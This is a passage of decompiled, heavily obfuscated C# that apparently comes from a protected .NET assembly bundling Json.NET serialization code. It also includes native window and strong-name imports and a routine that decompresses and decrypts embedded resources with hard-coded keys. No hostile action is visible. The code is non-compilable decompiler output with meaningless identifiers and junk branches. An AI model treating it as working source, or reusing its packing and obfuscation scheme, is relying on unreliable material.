              break;
          }
          else
            goto label_0;
        }
        break;
      }
      return false;
    }

    static bool \u0001(System.Type _param0, System.Type _param1, out System.Type _param2)
    {
      if (!\u0015.\u000E.\u0003(_param0))
        goto label_6;
label_1:
      System.Type type;
      if (true)
      {
        type = \u0001\u0002.\u007E\u001E\u0004((object) _param0);
        goto label_12;
      }
label_6:
      if (true)
      {
        if ((object) \u0015.\u000E.\u0001(_param0) == null)
        {
          _param2 = (System.Type) null;
          if (true)
            return false;
        }
        else
        {
          int num = \u0014.\u0006.\u0001(\u0015.\u000E.\u0001(_param0), _param1, out _param2) ? 1 : 0;
          if (false)
            return num != 0;
          return false ? num != 0 : num != 0;
        }
      }
      else
        goto label_1;
label_12:
      if ((object) _param1 == (object) type)
      {
        _param2 = _param0;
        return true;
      }
      goto label_6;
    }

    static void \u0001([In] \u0011.\u0003 obj0, [In] char obj1, [In] \u0012.\u0005 obj2)
    {
      ++obj0.\u0002;
      \u0014.\u0006.\u0001(obj0);
      \u0014.\u0006.\u0001(obj0, obj1);
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, true);
      switch (obj2)
      {
        case \u0012.\u0005.\u0002:
          break;
        case \u0012.\u0005.\u0003:
          Guid guid;
          byte[] numArray = obj0.\u0001.\u0002() != 0 ? (obj0.\u0001.\u0002() != 36 || !\u0014.\u0006.\u0001(obj0.\u0001.ToString(), out guid) ? \u000E\u0005.\u0004\u000E(obj0.\u0001.\u0001(), obj0.\u0001.\u0001(), obj0.\u0001.\u0002()) : guid.ToByteArray()) : new byte[0];
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Bytes, (object) numArray, false);
          break;
        case \u0012.\u0005.\u0004:
          string str1 = obj0.\u0001.ToString();
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) str1, false);
          ((\u0012.\u0007) obj0).\u0001 = obj1;
          break;
        case \u0012.\u0005.\u0005:
          break;
        case \u0012.\u0005.\u000E:
          break;
        default:
          if (((\u0012.\u0007) obj0).\u0001 != \u000E.\u0002.\u0001)
          {
            \u000E.\u0002 obj3;
            switch (obj2)
            {
              case \u0012.\u0005.\u0006:
                obj3 = \u000E.\u0002.\u0002;
                break;
              case \u0012.\u0005.\u0007:
                obj3 = \u000E.\u0002.\u0003;
                break;
              default:
                obj3 = ((\u0012.\u0007) obj0).\u0001;
                break;
            }
            if (obj3 == \u000E.\u0002.\u0002)
            {
              \u0015.\u0008 obj4 = obj0.\u0001;
              \u0004.\u0001 obj5 = ((\u0012.\u0007) obj0).\u0001;
              string str2 = ((\u0012.\u0007) obj0).\u0001;
              CultureInfo cultureInfo = \u0014.\u0006.\u0001((\u0012.\u0007) obj0);
              DateTime dateTime;
              if (\u0014.\u0006.\u0001(obj5, cultureInfo, ref dateTime, obj4, str2))
              {
                \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Date, (object) dateTime, false);
                break;
              }
            }
            else
            {
              DateTimeOffset dateTimeOffset;
              if (\u0014.\u0006.\u0001(obj0.\u0001, ((\u0012.\u0007) obj0).\u0001, \u0014.\u0006.\u0001((\u0012.\u0007) obj0), out dateTimeOffset))
              {
                \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Date, (object) dateTimeOffset, false);
                break;
              }
            }
          }
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) obj0.\u0001.ToString(), false);
          ((\u0012.\u0007) obj0).\u0001 = obj1;
          break;
      }
    }

    static string \u0001([In] char obj0, [In] \u0001.\u0003 obj1, [In] string obj2)
    {
      if (false)
        goto label_3;
      else
        goto label_8;
label_1:
      int num1 = 34;
label_2:
      int num2;
      if (num2 == num1)
        goto label_10;
label_3:
      if (true)
      {
        num2 = (int) obj0;
        if (true)
        {
          int num3 = 39;
          if (num3 == 0)
          {
            num1 = num3;
            goto label_2;
          }
          else
          {
            if (num2 != num3)
              throw new ArgumentException(\u0014.\u0006.\u0082(22216), \u0014.\u0006.\u0082(22277));
            goto label_10;
          }
        }
        else
          goto label_1;
      }
      else
        goto label_10;
label_8:
      num2 = (int) obj0;
      goto label_1;
label_10:
      return \u0014.\u0006.\u0001(obj2, obj0, true, obj1);
    }

    [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
    static extern bool \u0001(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] uint obj6);

    static \u0005.\u0005 \u0001([In] System.Type obj0, [In] object[] obj1) => JsonTypeReflector.\u0001.\u0001(obj0)(obj1);

    static \u0004.\u000E \u0001([In] MethodInfo obj0) => new \u0004.\u000E(new \u0016.\u0007.\u0002()
    {
      \u0001 = obj0
    }.\u0001);

    static DateTimeOffset \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0008, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(19618), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      if (obj.\u0001 is DateTimeOffset)
        return (DateTimeOffset) obj.\u0001;
      return obj.\u0001 is string ? \u000F\u0005.\u0005\u000E((string) obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004()) : new DateTimeOffset(\u0091\u0003.\u0082\u0007(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004()));
    }

    static unsafe string \u0001([In] int obj0, [In] \u0008.\u0005 obj1, [In] string obj2)
    {
      void* voidPtr;
      int num1;
      if (true)
      {
        int num2 = 8;
        if (num2 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if (true)
          {
            *(int*) voidPtr = obj0 & obj1.\u0003;
            goto label_10;
          }
          else
            goto label_8;
        }
        else
        {
          num1 = num2;
          goto label_6;
        }
      }
label_4:
      if (true)
        num1 = *(int*) ((IntPtr) voidPtr + 4);
      else
        goto label_10;
label_6:
      int num3 = obj1.\u0003;
      if (num1 == num3)
        \u0014.\u0006.\u0001(obj1);
label_8:
      \u0008.\u0005.\u0001 obj3;
      return obj3.\u0001;
label_10:
      obj3 = new \u0008.\u0005.\u0001(obj2, obj0, obj1.\u0001[*(int*) voidPtr]);
      obj1.\u0001[*(int*) voidPtr] = obj3;
      \u0008.\u0005 obj4 = obj1;
      *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0002;
      int num4 = *(int*) ((IntPtr) voidPtr + 4) + 1;
      obj4.\u0002 = num4;
      goto label_4;
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] int obj2, [In] char[] obj3, [In] char[] obj4)
    {
      if (false)
        return;
      \u0010\u0005.\u0006\u000E((Array) obj4, obj1 * 2, (Array) obj3, obj0 * 2, obj2 * 2);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static IDictionary \u0001(
      \u0012.\u0007 _param0,
      ref bool _param1,
      [Out] JsonSerializerInternalReader _param2,
      [In] \u0003.\u0006 obj3)
    {
      if (obj3.\u0002 == null)
        goto label_2;
      else
        goto label_16;
label_1:
      if (true)
      {
        _param1 = true;
        return \u0014.\u0006.\u0001(obj3);
      }
      goto label_7;
label_2:
      object obj;
      if (((\u0016.\u0007) obj3).\u0004)
      {
        _param1 = true;
        if (true)
          return \u0014.\u0006.\u0001(obj3);
        goto label_1;
      }
      else if (((\u0016.\u0007) obj3).\u0001() != null && (!obj3.\u0006() || _param2.\u0001.\u0001 == \u0001.\u0002.\u0002))
      {
        obj = ((\u0016.\u0007) obj3).\u0001()();
      }
      else
      {
        if (\u0014.\u0006.\u0001(obj3))
        {
          _param1 = true;
          return \u0014.\u0006.\u0001(obj3);
        }
        if (!obj3.\u0006)
          throw \u0014.\u0006.\u0001(_param0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11362), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0016.\u0007) obj3).\u0002()));
        throw \u0014.\u0006.\u0001(_param0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22290), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0016.\u0007) obj3).\u0002()));
      }
label_7:
      if (obj3.\u0001())
        obj = (object) \u0014.\u0006.\u0001(obj3, obj);
      if (true)
      {
        _param1 = false;
        return (IDictionary) obj;
      }
      goto label_1;
label_16:
      if (!obj3.\u0002())
      {
        _param1 = false;
        return (IDictionary) obj3.\u0002(new object[0]);
      }
      goto label_1;
    }

    static JsonReaderException \u0001([In] \u0011.\u0003 obj0, [In] char obj1) => \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22367), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1));

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static \u0015.\u0007 \u0001([In] System.Type obj0, [In] MethodBase obj1, [In] string[] obj2)
    {
      \u0015.\u0007 obj3 = new \u0015.\u0007();
      \u0012.\u000F obj4 = \u0014.\u0006.\u0001();
      if ((object) obj1 == null)
      {
        if (\u0014.\u0006.\u0001(obj0, false))
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: reference to a compiler-generated method
          obj3.\u0001(new \u0004.\u000F<object>(new \u0015.\u0007.\u0001()
          {
            \u0001 = obj4.\u0001<object>(obj0)
          }.\u0001));
        }
      }
      else
        goto label_24;
label_3:
      foreach (string key in obj2)
      {
        MemberInfo[] source = \u0011\u0004.\u007E\u0003\u0008((object) obj0, key, BindingFlags.Instance | BindingFlags.Public);
        MemberInfo memberInfo = source.Length == 1 ? ((IEnumerable<MemberInfo>) source).Single<MemberInfo>() : throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22448), (IFormatProvider) \u0098.\u0002\u0004(), (object) key));
        \u000F.\u0002 obj5 = new \u000F.\u0002();
        switch (\u0015.\u000E.\u0001(memberInfo))
        {
          case MemberTypes.Field:
          case MemberTypes.Property:
            if (\u0014.\u0006.\u0001(memberInfo, false))
              obj5.\u0001(obj4.\u0001<object>(memberInfo));
            if (\u0014.\u0006.\u0001(memberInfo, false, false))
            {
              obj5.\u0001(obj4.\u0001<object>(memberInfo));
              break;
            }
            break;
          case MemberTypes.Method:
            MethodInfo methodInfo = (MethodInfo) memberInfo;
            if (\u0015\u0002.\u007E\u001A\u0005((object) methodInfo))
            {
              ParameterInfo[] parameterInfoArray = \u0008\u0002.\u007E\u008D\u0004((object) methodInfo);
              // ISSUE: type reference
              if (parameterInfoArray.Length == 0 && (object) \u0001\u0002.\u007E\u001B\u0004((object) methodInfo) != (object) \u0004\u0002.\u0084\u0004(__typeref (void)))
              {
                // ISSUE: object of a compiler-generated type is created
                // ISSUE: reference to a compiler-generated method
                obj5.\u0001(new Func<object, object>(new \u0015.\u0007.\u0002()
                {
                  \u0001 = obj4.\u0001<object>((MethodBase) methodInfo)
                }.\u0001));
                break;
              }
              // ISSUE: type reference
              if (parameterInfoArray.Length == 1 && (object) \u0001\u0002.\u007E\u001B\u0004((object) methodInfo) == (object) \u0004\u0002.\u0084\u0004(__typeref (void)))
              {
                // ISSUE: object of a compiler-generated type is created
                // ISSUE: reference to a compiler-generated method
                obj5.\u0001(new Action<object, object>(new \u0015.\u0007.\u0003()
                {
                  \u0001 = obj4.\u0001<object>((MethodBase) methodInfo)
                }.\u0001));
                break;
              }
              break;
            }
            break;
          default:
            throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22509), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0015.\u000E.\u0001(memberInfo), (object) global::\u0001.\u007E\u000E((object) memberInfo)));
        }
        if (\u0014.\u0006.\u0001(memberInfo, false))
          obj5.\u0001(obj4.\u0001<object>(memberInfo));
        if (\u0014.\u0006.\u0001(memberInfo, false, false))
          obj5.\u0001(obj4.\u0001<object>(memberInfo));
        obj5.\u0001(\u0014.\u0006.\u0001(memberInfo));
        obj3.\u0001()[key] = obj5;
      }
      return obj3;
label_24:
      obj3.\u0001(obj4.\u0001(obj1));
      goto label_3;
    }

    static int? \u0001([In] string obj0)
    {
      switch (obj0)
      {
        case null:
          return new int?();
        default:
          return new int?(obj0.Length);
      }
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_41;
label_7:
      \u0013.\u000F.\u0007 obj1;
      int num1;
      if (*(int*) ((IntPtr) voidPtr + 4) == 0 && *(int*) ((IntPtr) voidPtr + 8) == 8)
      {
        num1 = \u0014.\u0006.\u0001(obj1);
        goto label_10;
      }
label_8:
      throw new FormatException("Wrong Header Signature");
label_10:
      int num2 = \u0014.\u0006.\u0001(obj1);
      int length1;
      if (true)
      {
        \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 12) = \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 16) = \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 20) = \u0014.\u0006.\u0001(obj1);
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          length1 = *(int*) ((IntPtr) voidPtr + 16);
          if (true)
          {
            byte[] buffer = new byte[length1];
            num2 = obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
          }
          else
            goto label_33;
        }
        else
          goto label_15;
      }
label_15:
      if (*(int*) ((IntPtr) voidPtr + 20) > 0)
      {
        byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
        obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
      }
      long num3 = obj1.Length;
      long length2;
      while (true)
      {
        long position = obj1.Position;
        length2 = num3 - position;
        if (false)
          num3 = length2;
        else
          break;
      }
      byte[] buffer1 = new byte[length2];
      obj1.Read(buffer1, 0, buffer1.Length);
      \u0013.\u000F.\u0001 obj2 = new \u0013.\u000F.\u0001(buffer1);
      byte[] numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
      \u0014.\u0006.\u0001(0, numArray1, obj2, numArray1.Length);
      goto label_40;
label_33:
      if (length1 == 3)
      {
        using (ICryptoTransform cryptoTransform = \u0014.\u0006.\u0001(true, new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        }, new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        }))
          numArray1 = \u0014.\u0006.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
label_40:
      obj1.Close();
      return numArray1;
label_41:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      Assembly assembly;
      if (true)
        assembly = executingAssembly;
      if ((object) callingAssembly != (object) assembly && !\u0014.\u0006.\u0001(assembly, callingAssembly))
        return (byte[]) null;
      obj1 = new \u0013.\u000F.\u0007(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = \u0014.\u0006.\u0001(obj1);
      int num4;
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 4) = \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 8) = \u0014.\u0006.\u0001(obj1);
        int num5 = *(int*) voidPtr;
        if (true)
        {
          if (true)
          {
            if (num5 != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20)
              goto label_8;
            else
              goto label_7;
          }
          else
          {
            num1 = num5;
            goto label_10;
          }
        }
        else
          num4 = num5;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
        *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
        if (*(int*) voidPtr != 8223355)
          throw new FormatException("Unknown Header");
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = \u0014.\u0006.\u0001(obj1);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          goto label_25;
        }
        else
          goto label_26;
      }
label_24:
      byte[] numArray2 = numArray1;
      \u0013.\u000F.\u0001 obj3;
      \u0013.\u000F.\u0001 obj4 = obj3;
      int num6 = *(int*) ((IntPtr) voidPtr + 40);
      \u0014.\u0006.\u0001(num4, numArray2, obj4, num6);
      *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
label_25:
      if (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
      {
        *(int*) ((IntPtr) voidPtr + 36) = \u0014.\u0006.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 40) = \u0014.\u0006.\u0001(obj1);
        byte[] buffer2 = new byte[*(int*) ((IntPtr) voidPtr + 36)];
        obj1.Read(buffer2, 0, buffer2.Length);
        obj3 = new \u0013.\u000F.\u0001(buffer2);
        num4 = *(int*) ((IntPtr) voidPtr + 32);
        goto label_24;
      }
label_26:
      if (*(int*) ((IntPtr) voidPtr + 24) == 2)
      {
        using (ICryptoTransform cryptoTransform = \u0014.\u0006.\u0001(new byte[8]
        {
          (byte) 172,
          (byte) 53,
          (byte) 43,
          (byte) 120,
          (byte) 6,
          (byte) 105,
          (byte) 231,
          (byte) 45
        }, new byte[8]
        {
          (byte) 196,
          (byte) 248,
          (byte) 128,
          (byte) 64,
          (byte) 90,
          (byte) 108,
          (byte) 55,
          (byte) 23
        }, true))
          numArray1 = \u0014.\u0006.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
      length1 = *(int*) ((IntPtr) voidPtr + 24);
      goto label_33;
    }

    static string \u0001([In] JsonSerializerInternalReader obj0, [In] \u0016.\u0007 obj1)
    {
      \u0003.\u0005 obj = obj1.\u0001;
      do
      {
        switch (obj)
        {
          case \u0003.\u0005.\u0002:
          case \u0003.\u0005.\u0006:
          case \u0003.\u0005.\u0008:
            goto label_1;
          case \u0003.\u0005.\u0003:
            goto label_3;
          case \u0003.\u0005.\u0004:
            goto label_4;
          case \u0003.\u0005.\u0005:
            goto label_5;
          default:
            continue;
        }
      }
      while (false);
      goto label_8;
label_1:
      if (true)
        return \u0014.\u0006.\u0082(22574);
label_3:
      return \u0014.\u0006.\u0082(22623);
label_4:
      return \u0014.\u0006.\u0082(22660);
label_5:
      return \u0014.\u0006.\u0082(22737);
label_8:
      throw new ArgumentOutOfRangeException();
    }

    static void \u0001([In] JsonSerializerInternalReader obj0, [In] \u0012.\u0007 obj1, [In] \u0016.\u0007 obj2, [In] object obj3)
    {
      if (obj0.\u0001 != null && obj0.\u0001.\u0001() >= TraceLevel.Info)
        goto label_2;
label_1:
      obj2.\u0001(obj3, obj0.\u0001.\u0001);
      return;
label_2:
      obj0.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(obj1 as \u000F.\u0001, obj1.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22762), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2.\u0002())), (Exception) null);
      goto label_1;
    }

    static \u0015.\u0011 \u0001([In] \u0016.\u0003 obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = (\u0015.\u0011) new \u0006.\u0003();
      return obj0.\u0001;
    }

    static string \u0001([In] object obj0, [In] JsonWriter obj1, [In] \u0010.\u0006 obj2)
    {
      string str;
      try
      {
        str = \u0014.\u0006.\u0001(((\u0016.\u0008) obj2).\u0001).\u0001((object) obj2, obj0);
      }
      catch (Exception ex)
      {
        throw \u0014.\u0006.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22799), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj0)), ex);
      }
      return str;
    }

    static void \u0001([In] \u0004.\u0005 obj0)
    {
      if (obj0.\u0001 <= 0)
        return;
      \u0014.\u0006.\u0001(\u0088\u0003.\u0019\u0007(obj0.\u0001, 0, obj0.\u0001, obj0.\u0001, 0), obj0, 0, obj0.\u0001);
      obj0.\u0001 = 0;
    }

    static bool \u0001([In] \u000E.\u000E obj0)
    {
      obj0.\u0003 = (\u0015.\u0013) null;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.None);
      return false;
    }

    static unsafe bool \u0001([In] \u0013.\u000F.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1 = \u0014.\u0006.\u0001(obj0.\u0001);
      while (true)
      {
        int index1;
        while (num1 >= 258)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 7:
              int num2 = \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0001);
              if (true)
              {
                index1 = num2;
                int num3;
                for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                {
                  \u0014.\u0006.\u0001(obj0.\u0001, index1);
                  num3 = num1;
                  if (true)
                  {
                    if ((num1 = num3 - 1) < 258)
                      return true;
                    goto case 7;
                  }
                }
                int num4 = index1;
                num2 = 257;
                num2 = num4;
              }
              if (num2 < num2)
              {
                if (index1 < 0)
                  return false;
                obj0.\u0002 = (\u0013.\u000F.\u0004) null;
                obj0.\u0001 = (\u0013.\u000F.\u0004) null;
                obj0.\u0001 = 2;
                return true;
              }
              obj0.\u0003 = \u0013.\u000F.\u0001.\u0001[index1 - 257];
              obj0.\u0002 = \u0013.\u000F.\u0001.\u0002[index1 - 257];
              goto case 8;
            case 8:
              if (obj0.\u0002 > 0)
              {
                obj0.\u0001 = 8;
                if (true)
                {
                  *(int*) voidPtr = \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0002);
                  if (*(int*) voidPtr < 0)
                    return false;
                  \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
              }
              obj0.\u0001 = 9;
              goto case 9;
            case 9:
              index1 = \u0014.\u0006.\u0001(obj0.\u0002, obj0.\u0001);
              goto label_20;
            case 10:
              goto label_23;
            default:
              continue;
          }
        }
        goto label_29;
label_20:
        if (index1 >= 0)
        {
          obj0.\u0004 = \u0013.\u000F.\u0001.\u0003[index1];
          obj0.\u0002 = \u0013.\u000F.\u0001.\u0004[index1];
        }
        else
          break;
label_23:
        if (obj0.\u0002 > 0)
        {
          obj0.\u0001 = 10;
          *(int*) ((IntPtr) voidPtr + 4) = \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0002);
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0002);
            obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
          }
          else
            goto label_25;
        }
        \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
        num1 -= obj0.\u0003;
        obj0.\u0001 = 7;
        continue;
label_29:
        if (false)
          goto label_20;
        else
          goto label_30;
      }
label_21:
      return false;
label_25:
      return false;
label_30:
      return true;
    }

    static void \u0001(
      [In] \u0012.\u0007 obj0,
      [In] IXmlNode obj1,
      [In] string obj2,
      [In] \u0011.\u000E obj3,
      [In] XmlNodeConverter obj4,
      [In] XmlNamespaceManager obj5)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      XmlNodeConverter.\u0002 obj6 = new XmlNodeConverter.\u0002();
      \u0002.\u0006 obj7;
      do
      {
        // ISSUE: reference to a compiler-generated field
        obj6.\u0001 = obj2;
        // ISSUE: reference to a compiler-generated field
        string str = \u0014.\u0006.\u0001(obj6.\u0001);
        // ISSUE: reference to a compiler-generated field
        obj7 = \u0014.\u0006.\u0001(obj3, obj4, obj5, str, obj6.\u0001);
        obj1.\u0001((IXmlNode) obj7);
        int num1 = 0;
        int num2;
        while (obj0.\u0001() && obj0.\u0001() != JsonToken.EndArray)
        {
          if (true)
          {
            // ISSUE: reference to a compiler-generated field
            \u0014.\u0006.\u0001(obj4, obj0, obj3, obj5, obj6.\u0001, (IXmlNode) obj7);
            int num3 = num1 + 1;
            if (true)
            {
              num1 = num3;
            }
            else
            {
              num2 = num3;
              goto label_11;
            }
          }
          else
            goto label_14;
        }
        if (obj4.\u0003())
          \u0014.\u0006.\u0001(obj7, obj3, obj4);
        num2 = num1;
label_11:
        if (num2 != 1)
          goto label_3;
      }
      while (false);
      goto label_13;
label_3:
      return;
label_13:
      if (!obj4.\u0003())
        return;
label_14:
      // ISSUE: reference to a compiler-generated method
      \u0014.\u0006.\u0001(obj7.\u0001().OfType<\u0002.\u0006>().Single<\u0002.\u0006>(new Func<\u0002.\u0006, bool>(obj6.\u0001)), obj3, obj4);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static List<JsonSerializerInternalReader.\u0001> \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0011.\u0008 obj1,
      [In] JsonProperty obj2,
      [In] \u0012.\u0007 obj3,
      [In] System.Type obj4)
    {
      List<JsonSerializerInternalReader.\u0001> objList = new List<JsonSerializerInternalReader.\u0001>();
      int num1 = 0;
      string str;
      while (true)
      {
        bool flag = num1 != 0;
        int num2;
        do
        {
          switch (obj3.\u0001())
          {
            case JsonToken.PropertyName:
              str = obj3.\u0001().ToString();
              JsonSerializerInternalReader.\u0001 obj5 = new JsonSerializerInternalReader.\u0001()
              {
                \u0001 = obj3.\u0001().ToString(),
                \u0002 = \u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1), str),
                \u0001 = \u0014.\u0006.\u0001(obj1.\u0001(), str)
              };
              objList.Add(obj5);
              JsonProperty jsonProperty = obj5.\u0002 ?? obj5.\u0001;
              if (jsonProperty != null && !jsonProperty.\u0001())
              {
                if (jsonProperty.\u0001() == null)
                  jsonProperty.\u0001(\u0014.\u0006.\u0001(obj0, jsonProperty.\u0001));
                \u0005.\u0005 obj6 = \u0014.\u0006.\u0001(obj0, jsonProperty.\u0001(), jsonProperty.\u0002(), (\u0006.\u0002) obj1, obj2);
                if (\u0014.\u0006.\u0001(obj0, obj3, jsonProperty.\u0001(), obj6 != null))
                {
                  obj5.\u0001 = obj6 == null || !obj6.\u0002() ? \u0014.\u0006.\u0001(obj0, obj3, jsonProperty.\u0001, jsonProperty.\u0001(), jsonProperty, (\u0006.\u0002) obj1, obj2, (object) null) : \u0014.\u0006.\u0001(obj0, obj6, obj3, jsonProperty.\u0001, (object) null);
                  goto case JsonToken.Comment;
                }
                else
                  goto label_5;
              }
              else if (obj3.\u0001())
              {
                if (obj0.\u0001 != null && obj0.\u0001.\u0001() >= TraceLevel.Verbose)
                  obj0.\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001(obj3 as \u000F.\u0001, obj3.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22856), (IFormatProvider) CultureInfo.InvariantCulture, (object) str, (object) obj1.\u0002())), (Exception) null);
                if (obj0.\u0001.\u0001 != \u000E.\u0005.\u0002)
                {
                  if (obj1.\u0001() != null)
                  {
                    obj5.\u0001 = \u0014.\u0006.\u0001(obj3, obj1, obj2, obj0);
                    goto case JsonToken.Comment;
                  }
                  else
                  {
                    \u0014.\u0006.\u0001(obj3);
                    goto case JsonToken.Comment;
                  }
                }
                else
                  goto label_12;
              }
              else
                goto label_8;
            case JsonToken.Comment:
              continue;
            case JsonToken.EndObject:
              num2 = 1;
              if (num2 != 0)
              {
                flag = num2 != 0;
                goto case JsonToken.Comment;
              }
              else
                goto label_23;
            default:
              goto label_18;
          }
        }
        while (!flag && obj3.\u0001());
        goto label_20;
label_23:
        num1 = num2;
      }
label_5:
      throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15901), (IFormatProvider) CultureInfo.InvariantCulture, (object) str));
label_8:
      throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15901), (IFormatProvider) CultureInfo.InvariantCulture, (object) str));
label_12:
